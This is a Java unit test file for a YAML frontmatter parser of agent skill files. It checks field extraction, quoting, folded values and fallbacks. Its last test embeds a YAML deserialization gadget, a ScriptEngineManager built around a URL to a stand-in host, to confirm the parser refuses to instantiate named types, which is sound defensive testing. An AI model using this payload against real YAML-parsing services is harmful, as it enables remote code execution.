/*
 * Copyright 2026 Riptide Labs, <https://github.com/Riptide-Labs>
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package org.riptide.mcp.skills;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class SkillParserTest {

    @Test
    void readsFrontmatterFields() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: riptide-ddos-triage
                description: Classifies DDoS attack families.
                slash_command: /riptide-investigate-ddos
                ---

                # Body
                """);

        assertThat(skill.getName()).isEqualTo("riptide-ddos-triage");
        assertThat(skill.getDescription()).isEqualTo("Classifies DDoS attack families.");
        assertThat(skill.getSlashCommand()).isEqualTo("/riptide-investigate-ddos");
        assertThat(skill.getRawMarkdown()).contains("# Body");
    }

    /**
     * A colon is ordinary prose in a description, and YAML only ends the value at the newline. The
     * previous line-regex stopped at the first quote, which silently truncated exactly these.
     */
    @Test
    void keepsValuesContainingColonsAndQuotesIntact() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: "riptide-capacity"
                description: "Capacity planning: 95th percentile headroom, per RFC 2544"
                ---
                """);

        assertThat(skill.getName()).isEqualTo("riptide-capacity");
        assertThat(skill.getDescription())
                .isEqualTo("Capacity planning: 95th percentile headroom, per RFC 2544");
    }

    @Test
    void readsAValueFoldedAcrossLines() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: riptide-peering
                description: >-
                  BGP ASN and geographic traffic breakdown
                  for transit optimization.
                ---
                """);

        assertThat(skill.getDescription())
                .isEqualTo("BGP ASN and geographic traffic breakdown for transit optimization.");
    }

    /** A metadata typo must not cost the registry a skill. */
    @Test
    void fallsBackToDefaultsForMalformedFrontmatter() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: [unclosed
                  description: "broken
                ---

                # Body
                """);

        assertThat(skill.getName()).isEqualTo("fallback");
        assertThat(skill.getDescription()).isEqualTo("Riptide Agent Skill");
        assertThat(skill.getRawMarkdown()).contains("# Body");
    }

    @Test
    void fallsBackToDefaultsWithoutFrontmatter() {
        final SkillModel skill = SkillParser.parse("fallback", "# Just a heading\n");

        assertThat(skill.getName()).isEqualTo("fallback");
        assertThat(skill.getDescription()).isEqualTo("Riptide Agent Skill");
        assertThat(skill.getSlashCommand()).isNull();
    }

    @Test
    void fallsBackToDefaultsForUnterminatedFrontmatter() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: never-closed
                """);

        assertThat(skill.getName()).isEqualTo("fallback");
    }

    @Test
    void handlesEmptyContent() {
        assertThat(SkillParser.parse("fallback", null).getName()).isEqualTo("fallback");
        assertThat(SkillParser.parse("fallback", "  ").getRawMarkdown()).isEmpty();
    }

    /** Frontmatter is data: a document must not be able to name a type for the parser to build. */
    @Test
    void doesNotInstantiateTypesNamedInFrontmatter() {
        final SkillModel skill = SkillParser.parse("fallback", """
                ---
                name: !!javax.script.ScriptEngineManager [!!java.net.URL ["http://example.invalid/"]]
                ---
                """);

        assertThat(skill.getName()).isEqualTo("fallback");
    }
}
